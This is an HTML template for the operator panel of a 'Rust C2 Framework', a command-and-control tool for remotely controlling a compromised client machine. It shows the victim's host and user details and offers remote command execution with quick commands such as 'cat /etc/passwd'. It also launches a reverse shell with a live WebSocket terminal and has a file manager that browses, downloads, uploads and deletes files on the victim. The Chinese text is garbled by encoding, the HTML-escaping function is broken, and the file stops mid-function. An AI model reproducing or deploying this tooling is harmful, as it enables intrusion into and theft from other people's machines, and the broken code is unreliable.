<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rust C2 Framework - å®¢æˆ·ç«¯ç®¡ç†</title>
    <link rel="stylesheet" href="/static/style.css">
    <style>
        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }
        
        .shell-cursor {
            animation: blink 1s infinite;
        }
        
        .shell-terminal {
            position: relative;
        }
        
        .shell-input-line {
            display: flex;
            align-items: center;
        }
        
        .shell-prompt {
            color: #00ff00;
            font-weight: bold;
            margin-right: 5px;
        }
        
        #shellInput {
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: inherit;
            line-height: inherit;
        }
        
        #shellInput:focus {
            outline: none;
        }
        
        /* å¸ƒå±€è°ƒæ•´ - ç¡®ä¿å·¦å³ä¸¤ä¾§é«˜åº¦ä¸€è‡´ */
        .main-content-wrapper {
            display: flex;
            gap: 30px;
            align-items: flex-start;
        }
        
        /* è°ƒæ•´shellç»ˆç«¯é«˜åº¦ */
        .shell-terminal {
            height: 600px !important;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h1>å®¢æˆ·ç«¯ç®¡ç†</h1>
                <a href="/" class="back-btn">â† è¿”å›ä¸»é¡µ</a>
            </div>
        </div>

        <div class="main-content-wrapper">
            <div class="client-info-section">
                <h2>å®¢æˆ·ç«¯ä¿¡æ¯</h2>
                <div class="info-grid">
                    <div class="info-item">
                        <label>å®¢æˆ·ç«¯ID</label>
                        <span><code>{{ client.id }}</code></span>
                    </div>
                    <div class="info-item">
                        <label>ä¸»æœºå</label>
                        <span>{{ client.hostname }}</span>
                    </div>
                    <div class="info-item">
                        <label>ç”¨æˆ·å</label>
                        <span>{{ client.username }}</span>
                    </div>
                    <div class="info-item">
                        <label>æ“ä½œç³»ç»Ÿ</label>
                        <span>{{ client.os }} ({{ client.arch }})</span>
                    </div>
                <div class="info-item">
                    <label>IPåœ°å€</label>
                    <span>{{ client.ip }}</span>
                </div>
                {% if let Some(country) = client.country_info %}
                <div class="info-item">
                    <label>å›½å®¶ä¿¡æ¯</label>
                    <span>{{ country }}</span>
                </div>
                {% endif %}
                <div class="info-item">
                    <label>CPUå“ç‰Œ</label>
                    <span>{{ client.cpu_brand }}</span>
                </div>
                <div class="info-item">
                    <label>CPUé¢‘ç‡</label>
                    <span>{{ client.cpu_frequency }} MHz</span>
                </div>
                <div class="info-item">
                    <label>CPUæ ¸å¿ƒ</label>
                    <span>{{ client.cpu_cores }}</span>
                </div>
                <div class="info-item">
                    <label>å†…å­˜</label>
                    <span>{{ client.memory}} GB</span>
                </div>
                <div class="info-item">
                    <label>æ€»ç£ç›˜ç©ºé—´</label>
                    <span>{{ client.total_disk_space}} GB</span>
                </div>
                <div class="info-item">
                    <label>å¯ç”¨ç£ç›˜ç©ºé—´</label>
                    <span>{{ client.available_disk_space}} GB</span>
                </div>
                <div class="info-item">
                    <label>è¿æ¥æ—¶é—´</label>
                    <span>{{ client.connected_at.format("%Y-%m-%d %H:%M:%S") }}</span>
                </div>
                    <div class="info-item">
                        <label>æœ€åæ´»åŠ¨</label>
                        <span>{{ client.last_seen.format("%Y-%m-%d %H:%M:%S") }}</span>
                    </div>
                    <div class="info-item">
                        <label>çŠ¶æ€</label>
                        <span id="client-status">
                            <!-- çŠ¶æ€å°†é€šè¿‡JavaScriptåŠ¨æ€æ›´æ–° -->
                        </span>
                    </div>
                </div>
            </div>

            <div class="command-and-results">
                <div class="tabs">
                    <div class="tab-header">
                        <div class="tab-item active" data-tab="command">å‘½ä»¤æ‰§è¡Œ</div>
                        <div class="tab-item" data-tab="reverse-shell">åå¼¹Shell</div>
                        <div class="tab-item" data-tab="file">æ–‡ä»¶ç®¡ç†</div>
                    </div>
                    
                    <div class="tab-content active" id="command-tab">
                        <div class="command-section">
                            <h2>å‘½ä»¤æ‰§è¡Œ</h2>
                            
                            <div class="quick-commands">
                                <button class="quick-cmd" onclick="setCommand('whoami')">whoami</button>
                                <button class="quick-cmd" onclick="setCommand('pwd')">pwd</button>
                                <button class="quick-cmd" onclick="setCommand('ls -la')">ls -la</button>
                                <button class="quick-cmd" onclick="setCommand('ps aux')">ps aux</button>
                                <button class="quick-cmd" onclick="setCommand('netstat -an')">netstat -an</button>
                                <button class="quick-cmd" onclick="setCommand('uname -a')">uname -a</button>
                                <button class="quick-cmd" onclick="setCommand('cat /etc/passwd')">cat /etc/passwd</button>
                            </div>

                            <div class="command-form">
                                <input type="text" id="commandInput" class="command-input" placeholder="è¾“å…¥è¦æ‰§è¡Œçš„å‘½ä»¤..." />
                                <button class="btn btn-primary" onclick="executeCommand()">æ‰§è¡Œ</button>
                            </div>
                        </div>

                        <div class="results-section">
                            <h2>å‘½ä»¤æ‰§è¡Œç»“æœ</h2>
                            <button class="btn refresh-btn" onclick="refreshResults()">åˆ·æ–°</button>
                            
                            {% if commands.is_empty() %}
                                <div class="no-results">
                                    <h3>æš‚æ— å‘½ä»¤æ‰§è¡Œè®°å½•</h3>
                                    <p>æ‰§è¡Œå‘½ä»¤åï¼Œç»“æœå°†æ˜¾ç¤ºåœ¨è¿™é‡Œ</p>
                                </div>
                            {% else %}
                                <table class="results-table">
                                    <thead>
                                        <tr>
                                            <th>å‘½ä»¤</th>
                                            <th>æ‰§è¡Œæ—¶é—´</th>
                                            <th>ç»“æœ</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        {% for cmd in commands %}
                                        <tr>
                                            <td>{{ cmd.command }}</td>
                                            <td>{{ cmd.executed_at.format("%Y-%m-%d %H:%M:%S") }}</td>
                                            <td>
                                                <div class="result-output">
                                                    {% if !cmd.stdout.is_empty() %}
                                                        <div class="output-stdout">{{ cmd.stdout }}</div>
                                                    {% endif %}
                                                    {% if !cmd.stderr.is_empty() %}
                                                        <div class="output-stderr">{{ cmd.stderr }}</div>
                                                    {% endif %}
                                                    <div class="exit-code {% if cmd.exit_code == 0 %}success{% else %}error{% endif %}">
                                                        é€€å‡ºç : {{ cmd.exit_code }}
                                                    </div>
                                                </div>
                                            </td>
                                        </tr>
                                        {% endfor %}
                                    </tbody>
                                </table>
                            {% endif %}
                        </div>
                    </div>

                    <div class="tab-content" id="reverse-shell-tab">
                        <div class="command-section">
                            <h2>åå¼¹Shell</h2>
                            <p>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®å¯åŠ¨åå¼¹Shellã€‚è¯·ç¡®ä¿æ‚¨çš„ç›‘å¬å™¨å·²å‡†å¤‡å°±ç»ªã€‚</p>
                            <button class="btn btn-danger" onclick="startReverseShell()">å¯åŠ¨åå¼¹Shell</button>
                            <div class="result-output" style="margin-top: 20px;">
                                <p>åå¼¹ShellçŠ¶æ€: <span id="reverseShellStatus">æœªå¯åŠ¨</span></p>
                                <p>ä¼šè¯ID: <span id="reverseShellSessionId">æ— </span></p>
                                <p>è¯·åœ¨æ‚¨çš„ç›‘å¬å™¨ä¸ŠæŸ¥çœ‹è¿æ¥ã€‚</p>
                            </div>
                            <div class="shell-terminal" id="shellTerminal" tabindex="0" style="margin-top: 20px; background-color: #1e1e1e; color: #00ff00; padding: 10px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-y: scroll; border: 1px solid #333; outline: none; white-space: pre-wrap; word-wrap: break-word; cursor: text;">
                                <div id="shellOutput"></div>
                                <div class="shell-input-line" id="shellInputLine" style="display: none;">
                                    <span class="shell-prompt">$ </span>
                                    <span id="shellInput" contenteditable="true" style="outline: none; display: inline-block; min-width: 10px; background: transparent; border: none; color: #00ff00; font-family: 'Courier New', monospace;"></span>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="tab-content" id="file-tab">
                        <div class="file-manager">
                            <div class="file-manager-header">
                                <h2>æ–‡ä»¶ç®¡ç†</h2>
                                <div class="file-path-nav">
                                    <input type="text" id="currentPath" class="path-input" value="/" />
                                    <button class="btn" onclick="listDirectory()">æµè§ˆ</button>
                                    <button class="btn" onclick="goToParentDirectory()">ä¸Šçº§ç›®å½•</button>
                                </div>
                            </div>
                            
                            <div class="file-upload-section">
                                <h3>æ–‡ä»¶ä¸Šä¼ </h3>
                                <div class="upload-controls">
                                    <label for="fileUpload" class="btn btn-sm">é€‰æ‹©æ–‡ä»¶</label>
                                    <input type="file" id="fileUpload" style="display: none;" onchange="updateFileName(this)" />
                                    <span id="fileNameDisplay" style="margin-left: 10px; color: #8b949e;">æœªé€‰æ‹©ä»»ä½•æ–‡ä»¶</span>
                                    <button type="button" class="btn btn-sm" onclick="uploadFile()">ä¸Šä¼ </button>
                                </div>
                            </div>
                            
                            <div class="file-list-section">
                                <h3>ç›®å½•å†…å®¹</h3>
                                <table class="file-table">
                                    <thead>
                                        <tr>
                                            <th>åç§°</th>
                                            <th>ç±»å‹</th>
                                            <th>å¤§å°</th>
                                            <th>æƒé™</th>
                                            <th>æ‰€æœ‰è€…</th>
                                            <th>ä¿®æ”¹æ—¶é—´</th>
                                            <th>æ“ä½œ</th>
                                        </tr>
                                    </thead>
                                    <tbody id="fileList">
                                        <!-- æ–‡ä»¶åˆ—è¡¨å°†é€šè¿‡JavaScriptåŠ¨æ€å¡«å…… -->
                                    </tbody>
                                </table>
                            </div>
                            <div class="loading-indicator" id="loadingFiles" style="display: none;">
                                <div class="loading-content">
                                    <div class="loading-spinner"></div>
                                    <span>åŠ è½½ä¸­...</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Tabåˆ‡æ¢åŠŸèƒ½
        document.addEventListener('DOMContentLoaded', function() {
            const tabItems = document.querySelectorAll('.tab-item');
            const tabContents = document.querySelectorAll('.tab-content');
            
            tabItems.forEach(item => {
                item.addEventListener('click', function() {
                    const tabId = this.getAttribute('data-tab');
                    
                    // ç§»é™¤æ‰€æœ‰activeç±»
                    tabItems.forEach(tab => tab.classList.remove('active'));
                    tabContents.forEach(content => content.classList.remove('active'));
                    
                    // ä¸ºå½“å‰tabæ·»åŠ activeç±»
                    this.classList.add('active');
                    document.getElementById(`${tabId}-tab`).classList.add('active');
                    
                    // å¦‚æœæ˜¯æ–‡ä»¶ç®¡ç†æ ‡ç­¾ï¼Œè‡ªåŠ¨åˆ—å‡ºç›®å½•
                    if (tabId === 'file') {
                        document.querySelector('.file-upload-section').style.display = 'none';
                        document.querySelector('.file-list-section').style.display = 'none';
                        listDirectory();
                    } else if (tabId === 'reverse-shell') {
                        // åå¼¹Shellæ ‡ç­¾é¡µä¸éœ€è¦ç‰¹æ®Šå¤„ç†ï¼Œä½†å¯ä»¥æ›´æ–°çŠ¶æ€
                        document.getElementById('reverseShellStatus').textContent = 'ç­‰å¾…å¯åŠ¨...';
                    }
                });
            });
        });

        // å‘½ä»¤æ‰§è¡ŒåŠŸèƒ½
        function setCommand(command) {
            document.getElementById('commandInput').value = command;
        }

        async function executeCommand() {
            const command = document.getElementById('commandInput').value.trim();
            if (!command) {
                alert('è¯·è¾“å…¥å‘½ä»¤');
                return;
            }

            try {
                const response = await fetch(`/api/clients/{{ client.id }}/commands`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    credentials: 'same-origin',
                    body: JSON.stringify({
                        client_id: '{{ client.id }}',
                        command: command,
                        args: []
                    })
                });

                if (response.ok) {
                    alert('å‘½ä»¤å·²å‘é€');
                    document.getElementById('commandInput').value = '';
                    // 1ç§’ååˆ·æ–°ç»“æœ
                    setTimeout(refreshResults, 1000);
                } else {
                    alert('å‘é€å‘½ä»¤å¤±è´¥');
                }
            } catch (error) {
                alert('å‘é€å‘½ä»¤æ—¶å‡ºé”™: ' + error.message);
            }
        }

        let shellWebSocket = null; // å…¨å±€WebSocketå®ä¾‹

        async function startReverseShell() {
            if (confirm('ç¡®å®šè¦å¯åŠ¨åå¼¹Shellå—ï¼Ÿ')) {
                try {
                    const response = await fetch(`/api/clients/{{ client.id }}/reverse_shell`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        credentials: 'same-origin',
                        body: JSON.stringify({}) // No body needed for this request
                    });

                    if (response.ok) {
                        const data = await response.json();
                        
                        alert('åå¼¹Shellè¯·æ±‚å·²å‘é€');
                        document.getElementById('reverseShellStatus').textContent = 'è¯·æ±‚å·²å‘é€ï¼Œæ­£åœ¨ç­‰å¾…è¿æ¥...';
                        document.getElementById('reverseShellSessionId').textContent = 'ç­‰å¾…è¿æ¥';
                        
                        // ç­‰å¾…ä¸€æ®µæ—¶é—´è®©å®¢æˆ·ç«¯å»ºç«‹è¿æ¥ï¼Œç„¶åè·å–è¿æ¥åˆ—è¡¨
                        setTimeout(async () => {
                            await checkForReverseShellConnections();
                        }, 3000); // ç­‰å¾…3ç§’

                    } else {
                        alert('å‘é€åå¼¹Shellè¯·æ±‚å¤±è´¥');
                        document.getElementById('reverseShellStatus').textContent = 'å¯åŠ¨å¤±è´¥';
                        document.getElementById('reverseShellSessionId').textContent = 'æ— ';
                    }
                } catch (error) {
                    alert('å‘é€è¯·æ±‚æ—¶å‡ºé”™: ' + error.message);
                    document.getElementById('reverseShellStatus').textContent = 'å¯åŠ¨å¤±è´¥: ' + error.message;
                    document.getElementById('reverseShellSessionId').textContent = 'æ— ';
                }
            }
        }

        async function checkForReverseShellConnections() {
            try {
                const response = await fetch('/api/reverse_shells', {
                    method: 'GET',
                    credentials: 'same-origin'
                });

                if (response.ok) {
                    const data = await response.json();
                    if (data.connections && data.connections.length > 0) {
                        // ä½¿ç”¨æœ€æ–°çš„è¿æ¥
                        const connectionId = data.connections[data.connections.length - 1];
                        document.getElementById('reverseShellSessionId').textContent = connectionId;
                        
                        // å»ºç«‹WebSocketè¿æ¥
                        connectWebSocket(connectionId);
                    } else {
                        document.getElementById('reverseShellStatus').textContent = 'ç­‰å¾…è¿æ¥å»ºç«‹...';
                        // ç»§ç»­è½®è¯¢
                        setTimeout(async () => {
                            await checkForReverseShellConnections();
                        }, 2000);
                    }
                } else {
                    document.getElementById('reverseShellStatus').textContent = 'è·å–è¿æ¥åˆ—è¡¨å¤±è´¥';
                }
            } catch (error) {
                console.error('æ£€æŸ¥è¿æ¥å¤±è´¥:', error);
                document.getElementById('reverseShellStatus').textContent = 'æ£€æŸ¥è¿æ¥å¤±è´¥';
            }
        }

        function connectWebSocket(connectionId) {
            if (shellWebSocket) {
                shellWebSocket.close();
            }

            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const wsUrl = `${protocol}//${window.location.host}/ws/shell/${connectionId}`;
            shellWebSocket = new WebSocket(wsUrl);

            const shellOutput = document.getElementById('shellOutput');
            const shellInput = document.getElementById('shellInput');
            const shellInputLine = document.getElementById('shellInputLine');
            const shellTerminal = document.getElementById('shellTerminal');

            // å‘½ä»¤å†å²
            let commandHistory = [];
            let historyIndex = -1;

            shellWebSocket.onopen = () => {
                document.getElementById('reverseShellStatus').textContent = 'å·²è¿æ¥';
                shellOutput.textContent = 'è¿æ¥æˆåŠŸï¼Œç­‰å¾…Shellè¾“å‡º...\n$ ';
                shellInputLine.style.display = 'flex';
                shellInput.focus();
                
                // ç»ˆç«¯è·å¾—ç„¦ç‚¹
                shellTerminal.focus();
            };

            shellWebSocket.onmessage = (event) => {
                const data = event.data;
                shellOutput.textContent += data;
                scrollToBottom();
                
                // ç®€åŒ–é€»è¾‘ï¼šæ”¶åˆ°ä»»ä½•æ•°æ®åæ˜¾ç¤ºè¾“å…¥è¡Œ
                // è¿™æ ·ç”¨æˆ·å°±å¯ä»¥ç»§ç»­è¾“å…¥ä¸‹ä¸€ä¸ªå‘½ä»¤
                if (!shellInputLine.style.display || shellInputLine.style.display === 'none') {
                    setTimeout(() => {
                        shellInputLine.style.display = 'flex';
                        shellInput.focus();
                    }, 100); // ç¨å¾®å»¶è¿Ÿç¡®ä¿è¾“å‡ºå®Œæˆ
                }
            };

            shellWebSocket.onclose = () => {
                document.getElementById('reverseShellStatus').textContent = 'å·²æ–­å¼€';
                shellInputLine.style.display = 'none';
                shellOutput.textContent += '\nShellè¿æ¥å·²æ–­å¼€ã€‚';
                scrollToBottom();
            };

            shellWebSocket.onerror = (error) => {
                console.error('WebSocket Error:', error);
                document.getElementById('reverseShellStatus').textContent = 'è¿æ¥é”™è¯¯';
                shellOutput.textContent += `\nè¿æ¥é”™è¯¯: ${error.message || 'æœªçŸ¥é”™è¯¯'}`;
                scrollToBottom();
            };

            // é”®ç›˜äº‹ä»¶å¤„ç†
            function handleKeyDown(e) {
                if (!shellWebSocket || shellWebSocket.readyState !== WebSocket.OPEN) {
                    return;
                }

                switch (e.key) {
                    case 'Enter':
                        e.preventDefault();
                        const command = shellInput.textContent;
                        if (command.trim()) {
                            // æ·»åŠ åˆ°å†å²
                            commandHistory.push(command);
                            historyIndex = commandHistory.length;
                            
                            // å‘é€å‘½ä»¤
                            shellWebSocket.send(command + '\n');
                            
                            // åœ¨è¾“å‡ºä¸­æ˜¾ç¤ºå‘½ä»¤
                            shellOutput.textContent += command + '\n';
                            
                            // æ¸…ç©ºè¾“å…¥
                            shellInput.textContent = '';
                            
                            // éšè—è¾“å…¥è¡Œï¼Œç­‰å¾…å“åº”
                            shellInputLine.style.display = 'none';
                        }
                        break;
                        
                    case 'ArrowUp':
                        e.preventDefault();
                        if (historyIndex > 0) {
                            historyIndex--;
                            shellInput.textContent = commandHistory[historyIndex];
                            // å°†å…‰æ ‡ç§»åˆ°æœ«å°¾
                            moveCaretToEnd(shellInput);
                        }
                        break;
                        
                    case 'ArrowDown':
                        e.preventDefault();
                        if (historyIndex < commandHistory.length - 1) {
                            historyIndex++;
                            shellInput.textContent = commandHistory[historyIndex];
                            moveCaretToEnd(shellInput);
                        } else {
                            historyIndex = commandHistory.length;
                            shellInput.textContent = '';
                        }
                        break;
                        
                    case 'Tab':
                        e.preventDefault();
                        // å¯ä»¥åœ¨è¿™é‡Œå®ç°è‡ªåŠ¨è¡¥å…¨
                        break;
                        
                    case 'c':
                        if (e.ctrlKey) {
                            e.preventDefault();
                            // Ctrl+C å‘é€ä¸­æ–­ä¿¡å·
                            shellWebSocket.send('\x03');
                            shellOutput.textContent += '^C\n$ ';
                            shellInput.textContent = '';
                            shellInputLine.style.display = 'flex';
                        }
                        break;
                }
            }

            function moveCaretToEnd(el) {
                if (typeof window.getSelection != "undefined" && typeof document.createRange != "undefined") {
                    var range = document.createRange();
                    range.selectNodeContents(el);
                    range.collapse(false);
                    var sel = window.getSelection();
                    sel.removeAllRanges();
                    sel.addRange(range);
                }
            }

            function scrollToBottom() {
                shellTerminal.scrollTop = shellTerminal.scrollHeight;
            }

            // æ·»åŠ äº‹ä»¶ç›‘å¬å™¨
            shellInput.addEventListener('keydown', handleKeyDown);
            shellTerminal.addEventListener('click', () => {
                shellInput.focus();
            });
            
            // ä¿æŒç„¦ç‚¹
            setInterval(() => {
                if (shellInputLine.style.display !== 'none' && document.activeElement !== shellInput) {
                    shellInput.focus();
                }
            }, 100);
        }

        // ç§»é™¤æ—§çš„sendShellCommandå‡½æ•°ï¼Œç°åœ¨é€šè¿‡å›è½¦é”®å‘é€

        function refreshResults() {
            location.reload();
        }

        // å›è½¦é”®æ‰§è¡Œå‘½ä»¤
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('commandInput').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    executeCommand();
                }
            });
            
            document.getElementById('currentPath').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    listDirectory();
                }
            });
        });

        // æ–‡ä»¶ç®¡ç†åŠŸèƒ½
        let currentPath = '/';
        
        function renderFileList(serverResponse) {
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '';

            console.log('Rendering file list with server response:', serverResponse);

            // Extract entries from the server response
            let entries = [];
            if (serverResponse && serverResponse.data && serverResponse.data.entries) {
                entries = serverResponse.data.entries;
            }

            console.log('Extracted entries:', entries);

            if (!Array.isArray(entries) || entries.length === 0) {
                fileList.innerHTML = '<tr><td colspan="7" class="no-results">ç›®å½•ä¸ºç©º</td></tr>';
                return;
            }

            // æ’åºï¼šå…ˆæ–‡ä»¶å¤¹åæ–‡ä»¶ï¼ŒæŒ‰åç§°å­—ç¬¦å¤§å°æ’åº
            entries.sort((a, b) => {
                if (a.is_dir !== b.is_dir) {
                    return a.is_dir ? -1 : 1; // æ–‡ä»¶å¤¹æ’åœ¨å‰é¢
                }
                return a.name.localeCompare(b.name, 'zh-CN'); // æŒ‰å­—ç¬¦å¤§å°æ’åº
            });

            entries.forEach(entry => {
                console.log('Processing entry:', entry);

                const tr = document.createElement('tr');

                // åç§°åˆ—ï¼ŒåŒ…å«å›¾æ ‡
                const nameCell = document.createElement('td');
                if (entry.is_dir) {
                    nameCell.innerHTML = `<span class="file-icon">ğŸ“</span>
                                        <span class="directory" onclick="navigateToDirectory('${escapeHtml(entry.path)}')">${escapeHtml(entry.name)}</span>`;
                } else {
                    nameCell.innerHTML = `<span class="file-icon">ğŸ“„</span> ${escapeHtml(entry.name)}`;
                }
                nameCell.title = entry.path; // æ·»åŠ å®Œæ•´è·¯å¾„çš„tooltip

                // ç±»å‹åˆ—
                const typeCell = document.createElement('td');
                typeCell.textContent = entry.is_dir ? 'ç›®å½•' : 'æ–‡ä»¶';

                // å¤§å°åˆ—
                const sizeCell = document.createElement('td');
                if (entry.is_dir) {
                    sizeCell.textContent = '-';
                } else {
                    const fileSize = entry.size;
                    if (typeof fileSize === 'number') {
                        sizeCell.textContent = formatFileSize(fileSize);
                    } else {
                        sizeCell.textContent = '0 Bytes';
                    }
                }

                // æƒé™åˆ—
                const permissionsCell = document.createElement('td');
                if (entry.permissions) {
                    permissionsCell.innerHTML = `<span class="permissions">${escapeHtml(entry.permissions)}</span>`;
                } else {
                    permissionsCell.textContent = '-';
                }

                // æ‰€æœ‰è€…åˆ—
                const ownerCell = document.createElement('td');
                if (entry.owner && entry.group) {
                    ownerCell.innerHTML = `<span class="owner-group">${escapeHtml(entry.owner)}:${escapeHtml(entry.group)}</span>`;
                } else if (entry.owner) {
                    ownerCell.innerHTML = `<span class="owner-group">${escapeHtml(entry.owner)}</span>`;
                } else {
                    ownerCell.innerHTML = '<span class="owner-group">-</span>';
                }

                // ä¿®æ”¹æ—¶é—´åˆ—
                const timeCell = document.createElement('td');
                if (entry.modified) {
                    let modifiedDate;
                    if (typeof entry.modified === 'object' && entry.modified.tv_sec !== undefined) {
                        // å¤„ç†SystemTimeæ ¼å¼ {tv_sec: ..., tv_nsec: ...}
                        modifiedDate = new Date(entry.modified.tv_sec * 1000);
                    } else if (typeof entry.modified === 'object' && entry.modified.secs_since_epoch !== undefined) {
                        // å¤„ç†å…¶ä»–æ—¶é—´æ ¼å¼
                        modifiedDate = new Date(entry.modified.secs_since_epoch * 1000);
                    } else if (typeof entry.modified === 'string') {
                        modifiedDate = new Date(entry.modified);
                    } else if (typeof entry.modified === 'number') {
                        modifiedDate = new Date(entry.modified);
                    } else {
                        modifiedDate = null;
                    }

                    if (modifiedDate && !isNaN(modifiedDate.getTime())) {
                        timeCell.textContent = modifiedDate.toLocaleString('zh-CN', {
                            year: 'numeric',
                            month: '2-digit',
                            day: '2-digit',
                            hour: '2-digit',
                            minute: '2-digit'
                        });
                    } else {
                        timeCell.textContent = '-';
                    }
                } else {
                    timeCell.textContent = '-';
                }

                // æ“ä½œåˆ—
                const actionCell = document.createElement('td');
                actionCell.className = 'file-actions';

                if (entry.is_dir) {
                    actionCell.innerHTML = `
                        <button class="btn btn-sm" onclick="navigateToDirectory('${escapeHtml(entry.path)}')">æ‰“å¼€</button>
                        <button class="btn btn-sm btn-danger" onclick="deletePath('${escapeHtml(entry.path)}')">åˆ é™¤</button>
                    `;
                } else {
                    actionCell.innerHTML = `
                        <a href="/api/files/download/${encodeURIComponent(entry.path)}?client_id={{ client.id }}" class="btn btn-sm">ä¸‹è½½</a>
                        <button class="btn btn-sm btn-danger" onclick="deletePath('${escapeHtml(entry.path)}')">åˆ é™¤</button>
                    `;
                }
                
                tr.appendChild(nameCell);
                tr.appendChild(typeCell);
                tr.appendChild(sizeCell);
                tr.appendChild(permissionsCell);
                tr.appendChild(ownerCell);
                tr.appendChild(timeCell);
                tr.appendChild(actionCell);
                
                fileList.appendChild(tr);
            });
        }
        
        // æ·»åŠ HTMLè½¬ä¹‰å‡½æ•°ä»¥é˜²æ­¢XSS
        function escapeHtml(text) {
            const map = {
                '&': '&',
                '<': '<',
                '>': '>',
                '"': '"',
                "'": '&#039;'
            };
            return text.replace(/[&<>"']/g, function(m) { return map[m]; });
        }
        
        async function listDirectory() {
            const path = document.getElementById('currentPath').value.trim();
            if (!path) {
                alert('è¯·è¾“å…¥æœ‰æ•ˆè·¯å¾„');
                return;
            }
            
            currentPath = path;
            document.getElementById('loadingFiles').style.display = 'block';
            document.querySelector('.file-upload-section').style.display = 'none';
            document.querySelector('.file-list-section').style.display = 'none';
            document.getElementById('fileList').innerHTML = '';
            
            try {
                console.log('Sending request to list directory:', path); // Debug log
                
                const response = await fetch(`/api/files/list`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    credentials: 'same-origin',
                    body: JSON.stringify({
                        client_id: '{{ client.id }}',
                        path: path,
                        recursive: false
                    })
                });
                
                console.log('Response status:', response.status); // Debug log
                console.log('Response headers:', Object.fromEntries(response.headers.entries())); // Debug log
                
                if (response.ok) {
                    const data = await response.json();
                    console.log('Full response data:', data); // Debug log
                    
                    if (data.success) {
                        // ç›´æ¥ä¼ é€’æ•´ä¸ªdataå¯¹è±¡åˆ°renderFileList
                        renderFileList(data);
                    } else {
                        console.error('Server returned error:', data.message);
                        alert(`è·å–æ–‡ä»¶åˆ—è¡¨å¤±è´¥: ${data.message}`);
                        document.getElementById('fileList').innerHTML = '<tr><td colspan="7" class="no-results">è·å–æ–‡ä»¶åˆ—è¡¨å¤±è´¥</td></tr>';
                    }
                } else {
                    console.error('HTTP error:', response.status);
                    const errorText = await response.text();
                    console.error('Error response body:', errorText);
                    
                    try {
                        const error = JSON.parse(errorText);
                        alert(`è·å–æ–‡ä»¶åˆ—è¡¨å¤±è´¥: ${error.message || 'Unknown error'}`);
                    } catch (e) {
                        alert(`è·å–æ–‡ä»¶åˆ—è¡¨å¤±è´¥: HTTP ${response.status}`);
                    }
                    document.getElementById('fileList').innerHTML = '<tr><td colspan="7" class="no-results">è·å–æ–‡ä»¶åˆ—è¡¨å¤±è´¥</td></tr>';
                }
            } catch (error) {
                console.error('Error fetching file list:', error);
                alert('è·å–æ–‡ä»¶åˆ—è¡¨æ—¶å‡ºé”™: ' + error.message);
                document.getElementById('fileList').innerHTML = '<tr><td colspan="7" class="no-results">ç½‘ç»œè¿æ¥é”™è¯¯</td></tr>';
            } finally {
                document.getElementById('loadingFiles').style.display = 'none';
                document.querySelector('.file-upload-section').style.display = 'block';
                document.querySelector('.file-list-section').style.display = 'block';
            }
        }
        
        function formatFileSize(bytes) {
            if (bytes === 0 || bytes === null || bytes === undefined) return '0 Bytes';
            if (typeof bytes !== 'number') return '0 Bytes';
            
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }
        
        function navigateToDirectory(path) {
            document.getElementById('currentPath').value = path;
            listDirectory();
        }
        
        function goToParentDirectory() {
            const currentPath = document.getElementById('currentPath').value.trim();
            if (currentPath === '/' || currentPath === '') {
                return; // å·²ç»åœ¨æ ¹ç›®å½•
            }
            
            const pathParts = currentPath.split('/').filter(Boolean);
            pathParts.pop(); // ç§»é™¤æœ€åä¸€ä¸ªç›®å½•
            const parentPath = pathParts.length === 0 ? '/' : '/' + pathParts.join('/');
            
            document.getElementById('currentPath').value = parentPath;
            listDirectory();
        }
        
        async function deletePath(path) {
            if (!confirm(`ç¡®å®šè¦åˆ é™¤ ${path} å—ï¼Ÿ`)) {
                return;
            }
            
            try {
                const response = await fetch(`/api/files/delete`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    credentials: 'same-origin',
                    body: JSON.stringify({
                        client_id: '{{ client.id }}',
                        path: path
                    })
                });
                
                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        alert('åˆ é™¤æˆåŠŸ');
                        listDirectory(); // åˆ·æ–°æ–‡ä»¶åˆ—è¡¨
                    } else {
                        alert(`åˆ é™¤å¤±è´¥: ${result.message}`);
                    }
                } else {
                    const errorText = await response.text();
                    try {
                        const error = JSON.parse(errorText);
                        alert(`åˆ é™¤å¤±è´¥: ${error.message || 'Unknown error'}`);
                    } catch (e) {
                        alert(`åˆ é™¤å¤±è´¥: HTTP ${response.status}`);
                    }
                }
            } catch (error) {
                alert('åˆ é™¤æ—¶å‡ºé”™: ' + error.message);
            }
        }
        
        async function uploadFile() {
            const fileInput = document.getElementById('fileUpload');
            const currentPath = document.getElementById('currentPath').value.trim();
            
            if (!fileInput.files || fileInput.files.length === 0) {
                alert('è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶');
                return;
            }
            
            const file = fileInput.files[0];
            const targetPath = `${currentPath}/${file.name}`.replace(/\/\//g, '/');
            
            try {
                const response = await fetch(`/api/files/upload/${encodeURIComponent(targetPath)}?client_id={{ client.id }}`, {
                    method: 'POST',
                    credentials: 'same-origin',
                    body: file  // ç›´æ¥å‘é€æ–‡ä»¶ï¼Œä¸ç”¨FormData
                });
                
                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        alert('æ–‡ä»¶ä¸Šä¼ æˆåŠŸ');
